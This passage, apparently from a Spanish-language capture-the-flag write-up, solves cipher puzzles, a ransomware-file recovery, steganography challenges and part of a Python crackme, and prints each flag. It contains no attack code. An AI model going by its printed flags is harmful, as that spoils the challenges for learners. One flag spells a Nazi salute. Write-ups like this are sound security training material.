&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{classof08}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;turin&#34;&gt;TURIN&lt;/h2&gt;
&lt;p&gt;En este reto nos dan un string y una imagen, con el titulo se puede concluir que pertenece a la maquina de turing y la imagen pertenece a la configuracion que debe de tener la maquina para poder obtener el mensaje oculto en el string. Utilizamos la pagina de cryptii.com para obtener nuestra flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;text:ixqajtrjaq
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/turin.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{heilhitler}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;impa&#34;&gt;IMPA&lt;/h2&gt;
&lt;p&gt;Para este reto nos dan una pista, al investigar acerca del personaje nos encontramos en la wiki de zelda el lenguaje Sheikah, utilizamos imagenes de google para poder obtener nuestra bandera tambien existe un traductor en dcode.fr/sheikah-language&lt;/p&gt;
&lt;p&gt;Wiki de Zelda: &lt;a href=&#34;https://zelda.gamepedia.com/Sheikah_Language&#34;&gt;https://zelda.gamepedia.com/Sheikah_Language&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Reto:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/zelda_impa.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Impa:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/zelda.jpg&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{ZELDALOVEU}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;batman&#34;&gt;BATMAN&lt;/h2&gt;
&lt;p&gt;Utilizamos motherreff.in(&lt;a href=&#34;https://mothereff.in/bacon&#34;&gt;https://mothereff.in/bacon&lt;/a&gt;) para decodificar la flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;AABABABABAAAAAAAABBA{AAAABAAAAABAABAABABBAAAAAABBAAAAABAAABBBABAAAABBBAAABAABAAAAABAAABAAABAABAAAAAAABAAABBABBA}
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/batman.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;FLAG{BATMANCHIPERISEASY}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;king&#34;&gt;KING&lt;/h2&gt;
&lt;p&gt;Un poco de informacion de este reto, la NSA mostro un mensaje parecido a este en un twitt, segun un post (&lt;a href=&#34;https://news.ycombinator.com/item?id=7711800&#34;&gt;https://news.ycombinator.com/item?id=7711800&lt;/a&gt; ) es un tipo de rompecabezas que vienen en los periodicos. Existen difrentes paginas que pueden decodificar mensajes de este tipo.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.boxentriq.com/code-breaking/cryptogram&#34;&gt;https://www.boxentriq.com/code-breaking/cryptogram&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.oneacross.com/&#34;&gt;http://www.oneacross.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://quipqiup.com/&#34;&gt;https://quipqiup.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para resolver este reto utilizamos una pagina de las listadas anteriormente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/kng.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;izu gjweft yifgx izji tjluy wf yuwyu yijgiy frr vkiz jw kdu dgujt igadl j dzur jwe j hkudu fr hpaif.
izu maxy izji fvwue izu kdu dgujt igadl yifpu izu hkudu fr hpaif rgft izu hjyigx dzur vzf fnijkwue ki rgft izu rpxkwm upuhzjwi.
izu rpxkwm upuhzjwi mfi ki rgft j yatf vguyipug vzf fnijkwue ki kw izu yatf dzjthkfwyzkh fw yjiagw.
izux vuwi if yjiagw nudjayu qahkiug vjy rapp fr taijwi nujsdffwy.
izu nujsdffwy vugu rgft tjgy vzugu izu nannpx nannpuy, jw jwdkuwi rjwm izji vjy nagkue kw djtupfi pksue.
izu nannpx nannpuy djtu njdl jiug izu dpfvwy guyaggudiue zkt kw jw jwdkuwi nagkjp yhupp fr tjmkdjpwuyy.
izuw izu dfgwefm rgft suway puje jw jiijdl fr djwfuy fwif izu gayykjwy vzf guyhfweue nx ijlkwm tdefwjpey jvjx rgft dzkwj.
ykwdu dzkwj ekew&amp;#39;i zjsu jwxtfgu tdefwjpey izux eudkeue if nax j hkccj zai.
izu hkccj zai vjy izuw yifpuw nx j ijplkwm upuhzjwi rgft kwekj.
izu upuhzjwi vjy izu maga&amp;#39;y jwe zu pksue ji izu jyzgjt kw pfy jwmupuy.
izu upuhzjwi zje j hkm rgkuwe vzf ijamzi tjiz.
izu hkm ubhpfeue fwu ejx jwe puri izu vzfpu vfgpe vfweugkwm.
ykwdu izu hkm ubhpfeue izu lkwm hkm npjtue izu mkjwiy.
ykwdu izu mkjwiy zjiue nukwm npjtue izux pue jw jiijdl fw izu lkwm jwe ykwdu izux vugu fr dfagyu tadz nkmmug izux vugu skdifgkfay.
jriug izu mkjwiy iffl dfwigfp fr mguuwpjwe izux yijgiue rkmzikwm izu sklkwmy rgft kdupjwe.
izu fhhfwuwiy vugu uouwpx tjidzue yf izux uweue ah euyigfxkwm ujdz fizug jwe izux nudjtu ubikwdi.
izuw izu mfgkppjy yifpu izu zfwej igjkp 70&amp;#39;y rgft ifwx yfhgjwf izu puje mjwmyiug rgft kijpx.
ifwx yfhgjwf jdiajppx mfi izu zfwej&amp;#39;y rgft kwekj jwxzfv njdl if izu mfgkppjy.
izu mfgkppjy yijgiue djaykwm j galay kw izu nkm jhhpu, jdiajppx j nkm jhhpu, vzugu izux gjw fsug nkppx qfu jwe ukpuuw.
ykwdu izu rffinjpp hpjxugy vugu dzjykwm izut izu mfgkppjy zfhhue kwif izu mkjwi hujdz vkiz qjtuy vzf vjy uydjhkwm zky uskp hjguwiy.
izu yifgx uwey izugu k&amp;#39;t yfggx if yjx nai fz vupp zux, zux, zux.
izu rpjm ky &amp;#34;izux jpp pksue zjhhkpx uoug jriug&amp;#34;.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;the random story that makes no sense starts off with an ice cream truck a chef and a piece of pluto the guys that owned the ice cream truck stole the piece of pluto from the pastry chef who obtained it from the flying elephant the flying elephant got it from a sumo wrestler who obtained it in the sumo championship on saturn they went to saturn because jupiter was full of mutant beavcoons the beavcoons were from mars where the bubbly bubbles an ancient fang that was buried in camelot lived the bubbly bubbles came back ater the clowns resurrected him in an ancient burial spell of magicalness then the corndog from venus lead an attack of canoes onto the russians who responded by taking mcdonalds away from china since china didn t have anymore mcdonalds they decided to buy a pizza hut the pizza hut was then stolen by a talking elephant from india the elephant was the guru s and he lived at the ashram in los angeles the elephant had a pig friend who taught math the pig exploded one day and left the whole world wondering since the pig exploded the king pig blamed the giants since the giants hated being blamed they led an attack on the king and since they were of course much bigger they were victorious after the giants took control of greenland they started fighting the vikings from iceland the opponents were eqenly matched so they ended up destroying each other and they became extinct then the gorillas stole the honda trail s from tony soprano the lead gangster from italy tony soprano actually got the honda s from india anyhow back to the gorillas the gorillas started causing a rukus in the big apple actually a big apple where they ran over billy joe and eileen since the football players were chasing them the gorillas hopped into the giant peach with james who was escaping his evil parents the story ends there i m sorry to say but oh well hey hey hey the flag is they all lived happily eqer after
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Se cambio la &lt;code&gt;q&lt;/code&gt; por una &lt;code&gt;v&lt;/code&gt;.&lt;br /&gt;
&lt;code&gt;they all lived happily eqer after&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: they all lived happily ever after&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;save-me&#34;&gt;SAVE ME!&lt;/h2&gt;
&lt;p&gt;Archivos &lt;code&gt;.fun&lt;/code&gt;, Investigamos sobre la extension de estos archivos y encontramos que es un virus de tipo ransomware, el cual encripta los archivos con esa extension.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.pcrisk.es/guias-de-desinfeccion/8248-fun-ransomware&#34;&gt;https://www.pcrisk.es/guias-de-desinfeccion/8248-fun-ransomware&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para obtener los archivos encriptados en el archivo del reto utilizamos jigsaw.exe el cual nos permite desencriptar este tipo de archivos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/fun_fa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{Jigsaw_ransomware_in_house}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;esteganografia&#34;&gt;ESTEGANOGRAFIA&lt;/h1&gt;
&lt;h2 id=&#34;data&#34;&gt;DATA&lt;/h2&gt;
&lt;p&gt;Utilizamos exif para ver los metadatos de la imagen y encontramos la flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/data.jpg&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/data_stega.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{metadata_in_the_dark}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;matrix&#34;&gt;MATRIX&lt;/h2&gt;
&lt;p&gt;Utilizamos inlite para decodificar la imagen &lt;a href=&#34;https://online-barcode-reader.inliteresearch.com/&#34;&gt;https://online-barcode-reader.inliteresearch.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/matrix_flag.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{matr1x_qr}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;mondrian&#34;&gt;MONDRIAN&lt;/h2&gt;
&lt;p&gt;Una imagen que tiene un mensaje oculto, este lenguaje se llama &lt;code&gt;piet&lt;/code&gt; y se encuentra en imagenes que parecen estilo abstractas. (&lt;a href=&#34;http://www.dangermouse.net/esoteric/piet.html&#34;&gt;http://www.dangermouse.net/esoteric/piet.html&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;Decodificamos la imagen aqui:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bertnase.de/npiet/npiet-execute.php&#34;&gt;https://www.bertnase.de/npiet/npiet-execute.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/Mondrian.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/modrian_flag.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{p1et_programm1ng!}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;hide&#34;&gt;HIDE&lt;/h2&gt;
&lt;p&gt;Utilizamos binwalk para extraer lo que esta en el interior de la imagen, al extraer el archivo descomprimimos de nuevo y obtenemos un archivo txt, este nos indica que esta en diferentes bases, decodificamos el mensaje en &lt;code&gt;base64&lt;/code&gt; y &lt;code&gt;base32&lt;/code&gt; para obtener la flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/walk_stego.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tryhackme{b1nw4lk_0r_f0r3mo5t}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;reversing&#34;&gt;REVERSING&lt;/h1&gt;
&lt;h2 id=&#34;crackme1&#34;&gt;CRACKME1&lt;/h2&gt;
&lt;p&gt;Para hacer una compilacion inversa al archivo crackme.pyc existe una herramienta llamada uncompyle2 para obtener el codigo fuente equivalente al archivo.&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;uncompyle2 crackme.pyc -o crackme.py
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Codigo fuente (Ordenado manualmente para obtener la flag):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;lr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ef&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ty&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;gh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;!&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;aa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;O&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;rr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;nn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;chains&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;104&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;108&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;108&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;chars&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;lock_pick&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;randint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock_pick&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;104&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;121&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;auth&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;121&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;103&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
